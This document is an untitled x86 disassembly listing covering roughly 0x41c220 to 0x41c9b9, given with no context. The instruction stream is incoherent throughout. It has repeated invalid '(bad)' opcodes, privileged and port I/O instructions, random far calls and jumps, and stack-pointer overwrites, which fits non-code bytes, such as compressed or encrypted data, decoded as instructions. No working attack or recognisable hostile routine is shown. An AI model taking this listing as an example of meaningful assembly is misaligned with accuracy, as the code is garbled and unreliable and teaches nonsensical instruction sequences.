  41c220:	mov    ebp,0xd86bbe54
  41c225:	mov    esi,0xec11b90a
  41c22a:	cmp    DWORD PTR [eax+0x30132ff0],ecx
  41c230:	ror    BYTE PTR [edi-0x47],cl
  41c233:	fild   WORD PTR [ebx]
  41c235:	call   0xcbe3:0x7c0ace9e
  41c23c:	mov    DWORD PTR [ebx+0x1b614a01],ebp
  41c242:	lahf   
  41c243:	lock xchg edx,eax
  41c245:	sub    ah,BYTE PTR [ecx]
  41c247:	add    al,0x87
  41c249:	mov    ecx,0xf601a5c5
  41c24e:	mov    al,0xa3
  41c250:	mov    esp,0xe743873
  41c255:	push   ebx
  41c256:	and    al,0xbb
  41c258:	push   cs
  41c259:	jno    0x41c2cd
  41c25b:	rcr    DWORD PTR [esp+ecx*4-0x78],0x22
  41c260:	ins    DWORD PTR es:[edi],dx
  41c261:	xor    eax,ecx
  41c263:	xchg   BYTE PTR [eax],ch
  41c265:	push   edi
  41c266:	(bad)  
  41c267:	push   cs
  41c268:	cwde   
  41c269:	clc    
  41c26a:	int    0xf0
  41c26c:	mul    BYTE PTR [ecx+0x3ff7649b]
  41c272:	(bad)
  41c275:	repz das 
  41c277:	fisttp DWORD PTR [esi*1+0x6412c4de]
  41c27e:	sti    
  41c27f:	ins    BYTE PTR es:[edi],dx
  41c280:	jae    0x41c238
  41c282:	sbb    dh,ch
  41c284:	pop    edx
  41c285:	mov    bl,0x88
  41c287:	retf   
  41c288:	push   0x4a13dd0
  41c28d:	leave  
  41c28e:	scas   eax,DWORD PTR es:[edi]
  41c28f:	pop    ecx
  41c290:	into   
  41c291:	jnp    0x41c2fc
  41c293:	test   al,0xe0
  41c295:	cs xchg esp,ebp
  41c298:	pop    eax
  41c299:	xchg   esp,eax
  41c29a:	in     eax,dx
  41c29b:	mov    ebp,DWORD PTR [esi]
  41c29d:	inc    ecx
  41c29e:	addr16 mov bh,0xd7
  41c2a1:	aas    
  41c2a2:	add    al,0x2e
  41c2a4:	sti    
  41c2a5:	data16 and BYTE PTR [edx+0x4f],ch
  41c2a9:	call   0x3cdfab3
  41c2ae:	leave  
  41c2af:	(bad)  
  41c2b0:	ins    DWORD PTR es:[edi],dx
  41c2b1:	bound  esp,QWORD PTR [ecx+ebx*8]
  41c2b4:	and    DWORD PTR [ecx-0x7d288bd9],edx
  41c2ba:	arpl   WORD PTR [eax-0x59291ecc],si
  41c2c0:	and    al,0xf1
  41c2c2:	dec    esi
  41c2c3:	sbb    DWORD PTR [ebx+edi*4],0xffffff88
  41c2c7:	daa    
  41c2c8:	out    0xe1,al
  41c2ca:	inc    edx
  41c2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2cc:	xchg   ecx,eax
  41c2cd:	inc    ecx
  41c2ce:	dec    ecx
  41c2cf:	pushf  
  41c2d0:	pop    ecx
  41c2d1:	cmp    DWORD PTR [edx],ebp
  41c2d3:	out    dx,eax
  41c2d4:	push   ebp
  41c2d5:	pushf  
  41c2d6:	stos   DWORD PTR es:[edi],eax
  41c2d7:	cmp    eax,0xecd7ce92
  41c2dc:	stos   DWORD PTR es:[edi],eax
  41c2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2de:	ret    0x47e2
  41c2e1:	aas    
  41c2e2:	push   esp
  41c2e3:	jno    0x41c304
  41c2e5:	and    BYTE PTR [esi+edi*1-0x4a2479c9],0xd0
  41c2ed:	iret   
  41c2ee:	cmp    DWORD PTR [ecx+0x1e],0xc
  41c2f2:	or     BYTE PTR [ebp+0x29],bl
  41c2f5:	mov    ecx,0x98079425
  41c2fa:	sahf   
  41c2fb:	adc    eax,ebx
  41c2fd:	retf   0xf770
  41c300:	sar    BYTE PTR [esi],1
  41c302:	(bad)  
  41c303:	pop    DWORD PTR [edi-0x45352ca2]
  41c309:	dec    esi
  41c30a:	add    dl,BYTE PTR [edx+0x4b]
  41c30d:	jae    0x41c2a0
  41c30f:	and    DWORD PTR ds:0xfb378983,edi
  41c315:	lock cld 
  41c317:	inc    eax
  41c318:	repnz adc eax,0x3faa3515
  41c31e:	dec    ebx
  41c31f:	jns    0x41c2bc
  41c321:	loop   0x41c354
  41c323:	push   es
  41c324:	inc    BYTE PTR [esi+0x5898723f]
  41c32a:	jo     0x41c386
  41c32c:	aas    
  41c32d:	addr16 pushf 
  41c32f:	fwait
  41c330:	jno    0x41c34f
  41c332:	xor    esp,0xffffffb6
  41c335:	test   DWORD PTR [eax-0x25],ebx
  41c338:	hlt    
  41c339:	push   ebp
  41c33a:	xchg   edx,edx
  41c33c:	ss dec esp
  41c33e:	xor    cl,BYTE PTR [edi]
  41c340:	xchg   al,ah
  41c342:	iret   
  41c343:	or     al,0x8c
  41c345:	stc    
  41c346:	fwait
  41c347:	mov    dh,0xdb
  41c349:	mov    edx,0x476ec973
  41c34e:	popf   
  41c34f:	rcr    ah,0x6e
  41c352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c353:	ja     0x41c33e
  41c355:	push   ebp
  41c356:	xor    al,0x9c
  41c358:	mov    esi,0x84fd152f
  41c35d:	ret    0x19d2
  41c360:	retf   0x467e
  41c363:	sbb    DWORD PTR [ebp-0x770c9323],edx
  41c369:	jp     0x41c3ac
  41c36b:	sbb    DWORD PTR [eax],edi
  41c36d:	es pop eax
  41c36f:	in     al,0x7c
  41c371:	add    al,0x6d
  41c373:	mov    edi,0xb5ce1702
  41c378:	nop
  41c379:	ds jmp 0x1ca1:0x49dfe4
  41c381:	sub    DWORD PTR [eax-0x30],edx
  41c384:	retf   0xac58
  41c387:	les    ebx,FWORD PTR [ebp*1+0x3640a5b9]
  41c38e:	in     al,0xfd
  41c390:	push   ds
  41c391:	rcl    edx,1
  41c393:	xor    eax,0x2988f1c2
  41c398:	pop    ebx
  41c399:	fdiv   QWORD PTR [ecx+esi*2-0x60]
  41c39d:	faddp  st(6),st
  41c39f:	mul    edx
  41c3a1:	shl    BYTE PTR [edi+0x411faa3c],0xcd
  41c3a8:	(bad)  
  41c3a9:	pop    ss
  41c3aa:	out    dx,al
  41c3ab:	push   0x3b
  41c3ad:	cli    
  41c3ae:	into   
  41c3af:	(bad)  
  41c3b0:	dec    esp
  41c3b1:	pop    esp
  41c3b2:	push   ds
  41c3b3:	sti    
  41c3b4:	and    BYTE PTR [esi+0x61],0x17
  41c3b8:	jne    0x41c378
  41c3ba:	mov    ecx,0x3b47c1e4
  41c3bf:	add    BYTE PTR [eax+0x5ab8d447],0xaf
  41c3c6:	aam    0xe4
  41c3c8:	pop    esi
  41c3c9:	push   0x2f
  41c3cb:	cmp    al,al
  41c3cd:	retf   0x8071
  41c3d0:	sbb    eax,0xa0f9d9c6
  41c3d5:	xor    al,0xd5
  41c3d7:	int3   
  41c3d8:	sub    eax,eax
  41c3da:	ins    BYTE PTR es:[edi],dx
  41c3db:	stc    
  41c3dc:	popa   
  41c3dd:	mov    edi,0x97b67fa6
  41c3e2:	or     ah,bl
  41c3e4:	test   eax,0xd305c21d
  41c3e9:	clc    
  41c3ea:	inc    edi
  41c3eb:	and    DWORD PTR [edx+0x18c2ba53],ecx
  41c3f1:	sub    al,0x4f
  41c3f3:	cmc    
  41c3f4:	xchg   edx,eax
  41c3f5:	clc    
  41c3f6:	jno    0x41c37c
  41c3f8:	ja     0x41c3a4
  41c3fa:	aam    0x3e
  41c3fc:	jle    0x41c45d
  41c3fe:	in     eax,0x28
  41c400:	adc    BYTE PTR [ecx-0x33c1d320],dl
  41c406:	push   es
  41c407:	into   
  41c408:	idiv   DWORD PTR [ebx]
  41c40a:	sbb    ebx,eax
  41c40c:	fstp   QWORD PTR [esi-0x21]
  41c40f:	sub    BYTE PTR [esi+0x53dd3cee],ah
  41c415:	in     al,0xb
  41c417:	scas   eax,DWORD PTR es:[edi]
  41c418:	xchg   DWORD PTR [eax-0x7b1f79ca],ecx
  41c41e:	adc    al,0x4e
  41c420:	scas   al,BYTE PTR es:[edi]
  41c421:	jecxz  0x41c3a5
  41c423:	mov    ds:0xf01f4f43,al
  41c428:	add    dh,0x5d
  41c42b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c42d:	cld    
  41c42e:	ret    
  41c42f:	push   0xd8207dc0
  41c434:	popf   
  41c435:	sbb    BYTE PTR [ebx+ebx*2+0x15896f9d],cl
  41c43c:	mov    ebx,0xc58650fd
  41c441:	ds inc ecx
  41c443:	sbb    esp,DWORD PTR [eax+0x25]
  41c446:	pop    eax
  41c447:	fsubr  QWORD PTR [edx+eiz*4]
  41c44a:	enter  0x4e5a,0x86
  41c44e:	das    
  41c44f:	ja     0x41c4a4
  41c451:	rcl    BYTE PTR [edx+0x34],1
  41c454:	(bad)  
  41c455:	aas    
  41c456:	sub    ecx,DWORD PTR [edi+0x24]
  41c459:	mov    al,0xde
  41c45b:	add    al,0x3c
  41c45d:	cmp    DWORD PTR [ecx-0x63f37bc1],0x1b
  41c464:	ds (bad) 
  41c466:	stc    
  41c467:	add    dh,ah
  41c469:	push   es
  41c46a:	sbb    esp,DWORD PTR [ecx+0x6d4e5f3a]
  41c470:	into   
  41c471:	icebp  
  41c472:	pop    ds
  41c473:	pop    ebx
  41c474:	add    al,0x32
  41c476:	pop    ds
  41c477:	xchg   ecx,eax
  41c478:	fstp   DWORD PTR [ebp-0x5f]
  41c47b:	jb     0x41c464
  41c47d:	std    
  41c47e:	shl    DWORD PTR [edx-0x5],1
  41c481:	sbb    BYTE PTR [ebx-0x55],bl
  41c484:	ja     0x41c467
  41c486:	(bad)  ds:0x94752063
  41c48c:	cmp    esi,DWORD PTR [edx-0x56]
  41c48f:	mov    ds:0x70731c03,eax
  41c494:	jo     0x41c468
  41c496:	xor    cl,BYTE PTR [edx-0x77e65db6]
  41c49c:	or     eax,0x110ec337
  41c4a1:	jecxz  0x41c512
  41c4a3:	xchg   esp,eax
  41c4a4:	mov    cl,0x6b
  41c4a6:	loop   0x41c513
  41c4a8:	int    0xab
  41c4aa:	mov    esp,0x2b0d4776
  41c4af:	test   ah,0xde
  41c4b2:	mov    al,0x4
  41c4b4:	test   eax,0x4713bbc4
  41c4b9:	cs jno 0x41c4a0
  41c4bc:	sbb    eax,0x708f159b
  41c4c1:	in     eax,dx
  41c4c2:	pop    ecx
  41c4c3:	and    bh,BYTE PTR [ecx+0x46]
  41c4c6:	inc    ebx
  41c4c7:	and    BYTE PTR [ecx+0x6e],0xcf
  41c4cb:	push   ecx
  41c4cc:	xor    edx,ebp
  41c4ce:	sbb    DWORD PTR [esi],ebp
  41c4d0:	add    BYTE PTR [esi+0x2098d7e2],al
  41c4d6:	pop    ecx
  41c4d7:	sbb    eax,0xf57b0e44
  41c4dc:	shl    DWORD PTR [ebx-0x2cb66040],cl
  41c4e2:	push   cs
  41c4e3:	mov    dl,0xf2
  41c4e5:	fdiv   DWORD PTR ds:0xcd4a1208
  41c4eb:	inc    ebx
  41c4ec:	and    DWORD PTR [eax+eiz*2-0x7fdaa7ea],esi
  41c4f3:	ror    DWORD PTR [edi-0x16643987],cl
  41c4f9:	jmp    0x5b4246b3
  41c4fe:	call   0xad471a25
  41c503:	ss jl  0x41c55e
  41c506:	add    eax,0x46bccc46
  41c50b:	sub    esi,DWORD PTR [ecx-0x6c]
  41c50e:	xlat   BYTE PTR ds:[ebx]
  41c50f:	mov    edi,0xdcadb2b7
  41c514:	ds js  0x41c576
  41c517:	cmp    esi,DWORD PTR [edi+0x78234fff]
  41c51d:	add    bh,ah
  41c51f:	mov    dl,0x5c
  41c521:	xchg   BYTE PTR [eax],cl
  41c523:	les    esp,FWORD PTR [esi+ebx*1]
  41c526:	cmp    eax,0x4c4face2
  41c52b:	or     BYTE PTR es:[esi+0x38],cl
  41c52f:	inc    eax
  41c530:	xlat   BYTE PTR ds:[ebx]
  41c531:	icebp  
  41c532:	pusha  
  41c533:	push   eax
  41c534:	or     eax,0x28e08f66
  41c539:	out    dx,al
  41c53a:	push   esp
  41c53b:	sbb    cl,al
  41c53d:	in     eax,0x50
  41c53f:	xor    eax,esp
  41c541:	push   0xae40f2b3
  41c546:	inc    ebx
  41c547:	xor    BYTE PTR [esi+0x37],dh
  41c54a:	std    
  41c54b:	xor    al,0xda
  41c54e:	lods   eax,DWORD PTR ds:[esi]
  41c54f:	add    dl,BYTE PTR [edx+0xe7efc70]
  41c555:	adc    al,0x5
  41c557:	jg     0x41c50e
  41c559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c55a:	loope  0x41c54c
  41c55c:	ja     0x41c4fb
  41c55e:	enter  0x835,0x2e
  41c562:	cmp    DWORD PTR [esi+eiz*4-0x7cb67e95],0xcc21f057
  41c56d:	sub    al,0x8e
  41c56f:	and    BYTE PTR [edx+eax*1-0x3c],al
  41c573:	jecxz  0x41c502
  41c575:	(bad)
  41c578:	add    edi,0xb87f917d
  41c57e:	ds hlt 
  41c580:	stos   BYTE PTR es:[edi],al
  41c581:	sub    cl,BYTE PTR [esi-0x51]
  41c584:	pop    ebp
  41c585:	(bad)  
  41c587:	mov    ebx,0x179a0034
  41c58c:	adc    BYTE PTR [ebp+0x26],dl
  41c58f:	mov    esp,0x8ae3f121
  41c594:	fs (bad) 
  41c597:	outs   dx,DWORD PTR ds:[esi]
  41c598:	in     al,dx
  41c599:	mov    esi,DWORD PTR [edi]
  41c59b:	in     eax,0xac
  41c59d:	lds    esi,FWORD PTR [ebp+0x54]
  41c5a0:	hlt    
  41c5a1:	enter  0x3642,0xf7
  41c5a5:	out    0x21,al
  41c5a7:	jns    0x41c5ed
  41c5a9:	fcmovbe st,st(3)
  41c5ab:	pushf  
  41c5ac:	retf   
  41c5ad:	mov    ebx,esp
  41c5af:	ret    0x675e
  41c5b2:	das    
  41c5b3:	dec    edx
  41c5b4:	shr    bh,0x27
  41c5b7:	xchg   edi,eax
  41c5b8:	fst    DWORD PTR [eax-0x72]
  41c5bb:	sahf   
  41c5bc:	and    ah,BYTE PTR [ebx+0x7b]
  41c5bf:	sub    eax,0x13b4c395
  41c5c4:	dec    ebp
  41c5c5:	pop    eax
  41c5c6:	std    
  41c5c7:	adc    dl,BYTE PTR [eax-0x10b2c7dc]
  41c5cd:	mov    ebp,0xf7af8ab8
  41c5d2:	push   ebp
  41c5d3:	cwde   
  41c5d4:	adc    bh,bh
  41c5d6:	mov    fs,WORD PTR ds:0x739a2e7e
  41c5dc:	scas   eax,DWORD PTR es:[edi]
  41c5dd:	mov    DWORD PTR [edi],esp
  41c5df:	mov    ds:0x1d12aac1,al
  41c5e4:	(bad)  
  41c5e5:	scas   al,BYTE PTR es:[edi]
  41c5e6:	jb     0x41c655
  41c5e8:	jns    0x41c587
  41c5ea:	inc    ecx
  41c5eb:	loopne 0x41c5e5
  41c5ed:	je     0x41c5e6
  41c5ef:	dec    eax
  41c5f0:	jns    0x41c5ce
  41c5f2:	add    dl,BYTE PTR [edi+0x60]
  41c5f5:	or     DWORD PTR [edi+0x79],0xe3a13b3d
  41c5fc:	inc    esi
  41c5fd:	and    DWORD PTR [ebx+0x24],ebp
  41c600:	push   cs
  41c601:	call   0xca17:0x3ea7d9cb
  41c608:	pop    esi
  41c609:	jo     0x41c66a
  41c60b:	jecxz  0x41c5b0
  41c60d:	dec    esi
  41c60e:	fsubp  st(2),st
  41c610:	test   DWORD PTR [ecx-0x236070bc],edi
  41c616:	dec    esi
  41c617:	push   edi
  41c618:	cwde   
  41c619:	cmp    eax,0xfa8eff67
  41c61e:	xchg   edx,esp
  41c620:	sub    BYTE PTR [ecx+0x739389e],bh
  41c626:	ret    0x8263
  41c629:	or     eax,0x73710683
  41c62e:	cmc    
  41c62f:	aam    0xaf
  41c631:	into   
  41c632:	sti    
  41c633:	xchg   ebx,eax
  41c634:	repz mov dl,0x7d
  41c637:	inc    ebx
  41c638:	push   ebp
  41c639:	add    bh,bh
  41c63b:	je     0x41c5ca
  41c63d:	pop    ss
  41c63e:	fild   WORD PTR [ebp+0x50ba5fd2]
  41c644:	push   ebx
  41c645:	and    al,0xd4
  41c647:	test   eax,0x1dc287ba
  41c64c:	ret    0x329b
  41c64f:	retf   0xdf94
  41c652:	sub    eax,0xfc3ed77c
  41c657:	xor    al,0x5c
  41c659:	outs   dx,DWORD PTR ds:[esi]
  41c65a:	xchg   ebx,eax
  41c65b:	xchg   edi,eax
  41c65c:	pop    ebx
  41c65d:	inc    ebp
  41c65e:	dec    esp
  41c65f:	scas   eax,DWORD PTR es:[edi]
  41c660:	(bad)  
  41c662:	mov    bl,0x2e
  41c664:	jbe    0x41c629
  41c666:	jne    0x41c659
  41c668:	xor    BYTE PTR [esi+0x7b],dh
  41c66b:	pop    esi
  41c66c:	pop    ecx
  41c66d:	push   ds
  41c66e:	and    dh,BYTE PTR [ebx+0x5c]
  41c671:	sbb    dl,bh
  41c673:	mov    edx,DWORD PTR [eax+0x730cca0]
  41c679:	pop    es
  41c67a:	test   eax,0xce9b4c09
  41c67f:	fisubr WORD PTR [eax]
  41c681:	mov    al,ds:0x4128495f
  41c686:	push   esp
  41c687:	pusha  
  41c688:	inc    ebp
  41c689:	lea    edx,[edi]
  41c68b:	pop    edx
  41c68c:	dec    eax
  41c68d:	repz cmp cl,BYTE PTR [ecx]
  41c690:	lods   al,BYTE PTR ds:[esi]
  41c691:	mov    ah,0xfa
  41c693:	mov    ch,0x2d
  41c695:	push   esp
  41c696:	mov    ah,0xa2
  41c698:	out    0xa8,al
  41c69a:	fidiv  DWORD PTR [ebp-0x4]
  41c69d:	mov    ah,dh
  41c69f:	sbb    cl,BYTE PTR [edi]
  41c6a1:	ficomp WORD PTR [ecx+ebx*4-0x7b]
  41c6a5:	cdq    
  41c6a6:	mov    cl,0x7f
  41c6a8:	daa    
  41c6a9:	inc    esp
  41c6aa:	fistp  DWORD PTR [eax]
  41c6ac:	cwde   
  41c6ad:	scas   eax,DWORD PTR es:[edi]
  41c6ae:	xor    dh,BYTE PTR [ecx-0x3ac5f48c]
  41c6b4:	and    bh,BYTE PTR [edi+0x55e87825]
  41c6ba:	push   0xb640b118
  41c6bf:	call   0x26bf5900
  41c6c4:	mov    esp,0xd7c6293a
  41c6c9:	jnp    0x41c70a
  41c6cb:	or     dh,bh
  41c6cd:	dec    edx
  41c6ce:	fstp   st(1)
  41c6d0:	lods   al,BYTE PTR ds:[esi]
  41c6d1:	enter  0x6c70,0x7
  41c6d5:	and    al,0xd4
  41c6d7:	into   
  41c6d8:	add    DWORD PTR [ebp-0x626671be],eax
  41c6de:	out    0xe4,eax
  41c6e0:	push   edx
  41c6e1:	mov    ecx,0xa9f9c2aa
  41c6e6:	ret    
  41c6e7:	add    edx,DWORD PTR [edi+esi*4-0x51b16946]
  41c6ee:	lea    edi,[ebx-0x7d3fa345]
  41c6f4:	jnp    0x41c680
  41c6f6:	nop
  41c6f7:	das    
  41c6f8:	push   ds
  41c6f9:	pop    edi
  41c6fa:	adc    DWORD PTR [ebx+0x5f9fa448],ebx
  41c700:	out    dx,al
  41c701:	push   ecx
  41c702:	xchg   edi,eax
  41c703:	out    dx,al
  41c704:	fadd   st(5),st
  41c706:	pop    edi
  41c707:	aad    0xc1
  41c709:	jecxz  0x41c6c2
  41c70b:	mov    BYTE PTR [eax],ch
  41c70d:	and    ah,BYTE PTR [eax]
  41c70f:	lock cs cs push esi
  41c713:	fs ins DWORD PTR es:[edi],dx
  41c715:	and    al,0x32
  41c717:	pop    edx
  41c718:	and    eax,0x98bbaff9
  41c71d:	lock shl DWORD PTR [edi],0x2b
  41c721:	dec    esi
  41c722:	mov    ebp,DWORD PTR [esi]
  41c724:	jmp    0x41c6e9
  41c726:	out    dx,al
  41c727:	mov    WORD PTR [eax-0x3302979f],fs
  41c72d:	shl    BYTE PTR [edi+0x55b14f72],0x35
  41c734:	push   edi
  41c735:	loop   0x41c702
  41c737:	push   esp
  41c738:	or     DWORD PTR [esi+edx*1-0x7ee1f696],esp
  41c73f:	jecxz  0x41c70c
  41c741:	adc    BYTE PTR [edx],ch
  41c743:	jne    0x41c7b3
  41c745:	pop    esi
  41c746:	das    
  41c747:	adc    bh,BYTE PTR [esi+0x54]
  41c74a:	dec    ebx
  41c74b:	mov    dh,dh
  41c74d:	cld    
  41c74e:	push   edx
  41c74f:	sub    al,0x1
  41c751:	popa   
  41c752:	sbb    bl,BYTE PTR [edx]
  41c754:	(bad)  
  41c755:	shl    DWORD PTR [esp+eax*1],0x66
  41c759:	dec    eax
  41c75a:	(bad)  
  41c75b:	aam    0x2
  41c75d:	stc    
  41c75e:	mov    eax,esp
  41c760:	inc    esp
  41c761:	cmp    edx,DWORD PTR [edx-0x32bb0eaf]
  41c767:	xchg   esp,eax
  41c768:	(bad)  
  41c769:	clc    
  41c76a:	jne    0x41c70d
  41c76c:	mov    ah,0x39
  41c76e:	mov    edx,0xf43a9f77
  41c773:	push   es
  41c774:	call   0x46ca:0x5e442525
  41c77b:	add    eax,0xa71928e
  41c780:	dec    ecx
  41c781:	push   cs
  41c782:	dec    esi
  41c783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c784:	mov    al,0x60
  41c786:	sub    dh,BYTE PTR [edi-0x37da0503]
  41c78c:	ds dec ebp
  41c78e:	lds    edx,FWORD PTR [ebp-0x51]
  41c791:	jns    0x41c786
  41c793:	aad    0x6b
  41c795:	xchg   ebx,esi
  41c797:	loop   0x41c80a
  41c799:	bound  esi,QWORD PTR [edi]
  41c79b:	jecxz  0x41c777
  41c79d:	nop
  41c79e:	jb     0x41c7f6
  41c7a0:	popf   
  41c7a1:	inc    ecx
  41c7a2:	and    DWORD PTR [eax],ecx
  41c7a4:	cmp    BYTE PTR [ebx+0x18902220],bl
  41c7aa:	add    ah,0xe5
  41c7ad:	leave  
  41c7ae:	mov    al,BYTE PTR [edi]
  41c7b0:	push   edi
  41c7b1:	popa   
  41c7b2:	in     al,dx
  41c7b3:	fmul   QWORD PTR [edi]
  41c7b5:	leave  
  41c7b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7b7:	xor    eax,DWORD PTR [ecx+0x2692e0f8]
  41c7bd:	mov    ebx,0x5de5c810
  41c7c2:	inc    si
  41c7c4:	in     eax,dx
  41c7c5:	retf   0x2500
  41c7c8:	fst    DWORD PTR [ebp-0x1f1c0d82]
  41c7ce:	sbb    esi,ecx
  41c7d0:	arpl   ax,dx
  41c7d2:	mov    edi,0x23af21dc
  41c7d7:	jmp    FWORD PTR [esi]
  41c7d9:	lds    edx,FWORD PTR [esi]
  41c7db:	fdivr  QWORD PTR [ebx+eax*2-0x76]
  41c7df:	push   edi
  41c7e0:	cwde   
  41c7e1:	out    dx,al
  41c7e2:	shl    DWORD PTR [esi-0xee7c614],cl
  41c7e8:	sbb    ecx,DWORD PTR [eax-0x60e928bd]
  41c7ee:	push   ds
  41c7ef:	daa    
  41c7f0:	inc    esi
  41c7f1:	jae    0x41c7d7
  41c7f3:	adc    al,0xc
  41c7f5:	mov    cs,ebp
  41c7f7:	test   eax,0xeab9758d
  41c7fc:	sbb    al,0x13
  41c7fe:	imul   esp,DWORD PTR [edx+0x4c0e25e6],0x26
  41c805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c806:	lahf   
  41c807:	test   bl,dh
  41c809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c80a:	mov    dl,0x84
  41c80c:	loope  0x41c82e
  41c80e:	imul   esp,ebx,0x8022b2c3
  41c814:	mov    dh,0x51
  41c816:	test   DWORD PTR [ebx+eax*8+0x232d998a],edi
  41c81d:	mov    ecx,0xe3ce4fe6
  41c822:	sti    
  41c823:	retf   
  41c824:	push   0x58c01690
  41c829:	outs   dx,BYTE PTR ds:[esi]
  41c82a:	call   FWORD PTR [ebx+0x5c]
  41c82d:	jp     0x41c87f
  41c82f:	test   ecx,ebx
  41c831:	test   DWORD PTR [eax+0x7dd61947],ebp
  41c837:	xchg   esp,eax
  41c838:	or     dl,0xe7
  41c83b:	cmp    DWORD PTR [edi-0x4910aeff],ebx
  41c841:	dec    ebp
  41c842:	inc    edi
  41c843:	xor    eax,0xc198d1ab
  41c848:	mov    dl,0x25
  41c84a:	stos   DWORD PTR es:[edi],eax
  41c84b:	arpl   WORD PTR [edi*2-0x6bb82aa5],ax
  41c852:	sahf   
  41c853:	test   edx,esp
  41c855:	sub    eax,0x87b963c1
  41c85a:	stos   DWORD PTR es:[edi],eax
  41c85b:	test   BYTE PTR [edi+0x41],0x8
  41c85f:	mov    ecx,DWORD PTR [ebp+0x4e98e9ff]
  41c865:	mov    es:0x239a1bd,al
  41c86b:	mov    edx,0x2ac171ae
  41c870:	dec    eax
  41c871:	sbb    eax,0x4e27becb
  41c876:	and    BYTE PTR [eax],dh
  41c878:	add    eax,0x2d8310d5
  41c87d:	ins    BYTE PTR es:[edi],dx
  41c87e:	sub    eax,0xd5a4f852
  41c883:	and    ebp,DWORD PTR [ecx]
  41c885:	(bad)  
  41c886:	mov    ds:0xaf9ada9,al
  41c88b:	jae    0x41c8cd
  41c88d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c88e:	retf   
  41c88f:	mov    DWORD PTR [esi+0x57],eax
  41c892:	pop    edx
  41c893:	rcr    BYTE PTR [esi-0x6d690806],cl
  41c899:	mov    edx,0xaac9c1cf
  41c89e:	mov    esi,0x58796074
  41c8a3:	fld    DWORD PTR [eax+0x3380759]
  41c8a9:	or     edi,ebp
  41c8ab:	gs aaa 
  41c8ad:	and    BYTE PTR [eax],bh
  41c8af:	das    
  41c8b0:	sbb    edx,ebp
  41c8b2:	test   BYTE PTR [edx],0xa
  41c8b5:	jmp    0x1ba673b5
  41c8ba:	aas    
  41c8bb:	icebp  
  41c8bc:	mov    ds:0x46bc2486,eax
  41c8c1:	adc    ebx,DWORD PTR [edi-0x21]
  41c8c4:	sub    DWORD PTR [ebp+edi*2-0x59],edx
  41c8c8:	add    esp,DWORD PTR [ebx+0x775c417c]
  41c8ce:	mov    ebx,0x7bfc5652
  41c8d3:	jo     0x41c8e9
  41c8d5:	mov    al,ds:0x9b933d01
  41c8da:	inc    edx
  41c8db:	fild   QWORD PTR ds:0xbe29672d
  41c8e1:	xor    DWORD PTR [edi-0x5f],ecx
  41c8e4:	mov    esp,0xd4a9dff4
  41c8e9:	adc    esp,ecx
  41c8eb:	pusha  
  41c8ec:	xchg   ebp,eax
  41c8ed:	int3   
  41c8ee:	popf   
  41c8ef:	and    BYTE PTR [ebp+0x64],bl
  41c8f2:	fild   WORD PTR [eax-0x7646a8ab]
  41c8f8:	aam    0x2e
  41c8fa:	test   eax,0xd7b0979a
  41c8ff:	cld    
  41c900:	push   esp
  41c901:	push   edx
  41c902:	iret   
  41c903:	push   edi
  41c904:	pushf  
  41c905:	add    al,BYTE PTR [ebx+edx*4]
  41c908:	ror    ebp,1
  41c90a:	repnz sar BYTE PTR ds:0xd5764cc5,0x73
  41c912:	mov    ebx,0x83e88287
  41c917:	mov    ecx,0x81ffb851
  41c91c:	stos   DWORD PTR es:[edi],eax
  41c91d:	mov    al,ds:0xf4cf5dce
  41c922:	push   ebp
  41c923:	jnp    0x41c951
  41c925:	jne    0x41c8d8
  41c927:	js     0x41c912
  41c929:	sub    DWORD PTR [edi],ebp
  41c92b:	cs fwait
  41c92d:	pop    es
  41c92e:	jecxz  0x41c9af
  41c930:	sti    
  41c931:	pop    edx
  41c932:	sbb    dl,BYTE PTR [edi+esi*8-0x5d]
  41c936:	mov    edx,0xb98d6f06
  41c93b:	push   esi
  41c93c:	icebp  
  41c93d:	jge    0x41c952
  41c93f:	outs   dx,BYTE PTR ds:[esi]
  41c940:	aas    
  41c941:	or     DWORD PTR [edx],esp
  41c943:	push   edx
  41c944:	and    eax,0xda61d0b9
  41c949:	jge    0x41c975
  41c94b:	xor    BYTE PTR [edi-0x39],dh
  41c94e:	popf   
  41c94f:	leave  
  41c950:	out    0x6a,eax
  41c952:	out    0xd7,eax
  41c954:	shl    esi,1
  41c956:	cli    
  41c957:	push   0x13
  41c959:	sbb    al,cl
  41c95b:	fwait
  41c95c:	cmp    esp,DWORD PTR [edx-0x512e40f4]
  41c962:	sbb    eax,0x8c76d66e
  41c967:	jp     0x41c942
  41c969:	jno    0x41c9a4
  41c96b:	imul   DWORD PTR [esi+0x14ca1363]
  41c971:	leave  
  41c972:	lds    eax,FWORD PTR [eax-0x64]
  41c975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c976:	popf   
  41c977:	xor    dl,BYTE PTR [edi+0x44]
  41c97a:	fiadd  DWORD PTR [ebx+0x1e]
  41c97d:	mov    esi,0x5b7d9aa6
  41c982:	cld    
  41c983:	add    ebx,DWORD PTR [edx]
  41c985:	push   esi
  41c986:	xchg   ebp,eax
  41c987:	bndstx [esi-0x7bc3a3ed],bnd3
  41c98e:	outs   dx,DWORD PTR ds:[esi]
  41c98f:	loope  0x41c995
  41c991:	rdpmc  
  41c993:	mov    ch,0x25
  41c995:	add    DWORD PTR [ebx],edi
  41c997:	pop    ebp
  41c998:	outs   dx,BYTE PTR ds:[esi]
  41c999:	pop    edi
  41c99a:	dec    esp
  41c99b:	and    DWORD PTR [ebx],esi
  41c99d:	pop    esp
  41c99e:	sahf   
  41c99f:	and    BYTE PTR [esi+0xff98057],bl
  41c9a5:	dec    ebx
  41c9a6:	repz sbb esp,ebx
  41c9a9:	pop    eax
  41c9aa:	xor    DWORD PTR [edi],edi
  41c9ac:	push   esi
  41c9ad:	pop    ecx
  41c9ae:	cmc    
  41c9af:	into   
  41c9b0:	sahf   
  41c9b1:	or     eax,0xbeb27eb2
  41c9b6:	jp     0x41c965
  41c9b8:	xchg   esi,eax
  41c9b9:	pop    ecx
